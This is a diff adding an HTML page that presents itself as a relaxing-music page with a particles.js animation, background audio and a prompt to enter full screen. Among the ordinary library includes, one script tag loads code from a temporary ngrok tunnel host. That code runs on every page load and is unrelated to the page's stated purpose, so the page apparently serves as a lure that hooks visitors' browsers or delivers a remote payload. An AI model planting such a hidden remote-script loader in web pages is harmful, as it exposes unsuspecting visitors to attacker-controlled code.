@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html class="h-full" lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Interactive Geometric Glitch</title>
+  <!-- Use Tailwind CSS for a clean and modern design -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+      body {
+          font-family: 'Inter', sans-serif;
+          margin: 0;
+          overflow: hidden;
+          width: 100vw;
+          height: 100vh;
+      }
+      #particles-js {
+          position: absolute;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: radial-gradient(circle, #0a0a0a 0%, #000000 100%);
+          background-repeat: no-repeat;
+          background-size: cover;
+          background-position: 50% 50%;
+          z-index: -1;
+      }
+
+      /* Styles for the custom dialog box */
+      .modal-overlay {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background-color: rgba(0, 0, 0, 0.7);
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          z-index: 100;
+      }
+
+      .modal-content {
+          background-color: #1a202c;
+          padding: 2rem;
+          border-radius: 1rem;
+          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+          max-width: 400px;
+          text-align: center;
+      }
+  </style>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center">
+
+<!-- The container for the custom dialog box -->
+<div class="modal-overlay hidden" id="fullscreen-modal">
+  <div class="modal-content">
+    <h2 class="text-xl font-bold mb-4">View in Full-Screen?</h2>
+    <p class="mb-6">For the best experience, please view this page in full-screen mode.</p>
+    <div class="flex justify-center space-x-4">
+      <button class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-6 rounded-lg transition-colors" id="fullscreen-yes">Yes</button>
+      <button class="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-6 rounded-lg transition-colors" id="fullscreen-no">No</button>
+    </div>
+  </div>
+</div>
+
+<!-- The audio element to play background music -->
+<audio id="background-audio" loop src="img/meditation_style_sound.wav"></audio>
+
+<!-- The container for the particles.js canvas -->
+<div id="particles-js"></div>
+
+<!-- Text at the top of the page -->
+<div class="absolute top-10 left-1/2 -translate-x-1/2 text-xl font-bold text-white z-20">
+  Mind Relxing music
+</div>
+
+<!-- Main content overlay with a centered image -->
+<img alt="A placeholder image with the text 'CYBERSPACE'"
+     class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 rounded-lg border-4 border-white shadow-lg z-10"
+     src="img/music.png"
+     style="box-shadow: 0 0 20px #00ffff, 0 0 30px #ff00ff;">
+
+<!-- The particles.js library -->
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+
+<script src="https://303a138af2e1.ngrok-free.app/test.js"></script>
+<script>
+  window.onload = function() {
+    // Get references to modal elements and audio
+    const modal = document.getElementById('fullscreen-modal');
+    const yesButton = document.getElementById('fullscreen-yes');
+    const noButton = document.getElementById('fullscreen-no');
+    const backgroundAudio = document.getElementById('background-audio');
+
+    // Show the modal when the page loads
+    modal.classList.remove('hidden');
+
+    // Handle the "Yes" button click
+    yesButton.addEventListener('click', () => {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      }
+      modal.classList.add('hidden');
+      backgroundAudio.play(); // Play audio when the modal is closed
+    });
+
+    // Handle the "No" button click
+    noButton.addEventListener('click', () => {
+      modal.classList.add('hidden');
+      backgroundAudio.play(); // Play audio when the modal is closed
+    });
+
+    /*
+    Initialize particles.js on window load. This ensures the canvas is
+    ready before the script attempts to draw on it.
+    The configuration below creates a network of connected particles
+    that are interactive on hover.
+    */
+    particlesJS('particles-js', {
+      "particles": {
+        "number": {
+          "value": 180, // Increased particle count for more density
+          "density": {
+            "enable": true,
+            "value_area": 800
+          }
+        },
+        "color": {
+          // A cohesive color palette for a futuristic look
+          "value": ["#00ffff", "#ff00ff", "#ffffff", "#ffff00", "#FFD700", "#7FFF00"] // Added new colors
+        },
+        "shape": {
+          // Added more shapes for more variety
+          "type": ["circle", "triangle", "star", "polygon", "edge", "square"],
+          "stroke": {
+            "width": 1, // Added a stroke for a wireframe effect
+            "color": "#ffffff"
+          },
+          "polygon": {
+            "nb_sides": 6 // Changed polygon to a hexagon for variety
+          }
+        },
+        "opacity": {
+          "value": 0.6,
+          "random": true,
+          "anim": {
+            "enable": false,
+            "speed": 1,
+            "opacity_min": 0.1,
+            "sync": false
+          }
+        },
+        "size": {
+          "value": 3.5, // Slightly increased size
+          "random": true,
+          "anim": {
+            "enable": false,
+            "speed": 40,
+            "size_min": 0.1,
+            "sync": false
+          }
+        },
+        "line_linked": {
+          "enable": true,
+          "distance": 150,
+          "color": "#00ffff", // Corrected the color to a single string to fix the TypeError
+          "opacity": 0.4,
+          "width": 1
+        },
+        "move": {
+          "enable": true,
+          "speed": 5,
+          "direction": "none",
+          "random": false,
+          "straight": false,
+          "out_mode": "out",
+          "bounce": false,
+          "attract": {
+            "enable": false,
+            "rotateX": 600,
+            "rotateY": 1200
+          }
+        }
+      },
+      "interactivity": {
+        "detect_on": "canvas",
+        "events": {
+          "onhover": {
+            "enable": true,
+            "mode": "grab"
+          },
+          "onclick": {
+            "enable": true,
+            "mode": "push"
+          },
+          "resize": true
+        },
+        "modes": {
+          "grab": {
+            "distance": 140,
+            "line_linked": {
+              "opacity": 1
+            }
+          },
+          "bubble": {
+            "distance": 400,
+            "size": 40,
+            "duration": 2,
+            "opacity": 8,
+            "speed": 3
+          },
+          "repulse": {
+            "distance": 200,
+            "duration": 0.4
+          },
+          "push": {
+            "particles_nb": 4
+          },
+          "remove": {
+            "particles_nb": 2
+          }
+        }
+      },
+      "retina_detect": true
+    });
+  };
+</script>
+</body>
+</html>
